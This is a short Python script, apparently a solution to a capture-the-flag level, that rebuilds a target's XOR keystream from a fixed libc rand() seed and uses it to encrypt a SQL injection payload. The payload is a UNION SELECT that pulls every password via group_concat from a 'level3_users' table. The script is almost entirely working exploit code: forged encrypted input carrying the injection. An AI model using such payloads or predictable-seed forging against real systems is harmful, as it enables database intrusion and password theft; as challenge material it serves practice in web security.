import ctypes
import base64

libc = ctypes.CDLL("libc.so.6")
libc.srand(3284724)
keys = [int(256.0 * libc.rand() / 2147483647.0) for _ in range(200)]
# 前 10 个: [107, 183, 99, 223, 226, 137, 255, 56, 162, 1]

def encrypt(plain: str) -> str:
    raw = ''.join(str(ord(ch) ^ keys[i]).zfill(3) for i, ch in enumerate(plain))
    return base64.b64encode(raw.encode()).decode()

def decrypt(ct: str) -> str:
    raw = base64.b64decode(ct).decode()
    return ''.join(chr(int(raw[i:i+3]) ^ keys[i//3]) for i in range(0, len(raw), 3))

s = "' union select '1',group_concat(password),'3','4','5','6','7' from level3_users#"

print(encrypt(s))
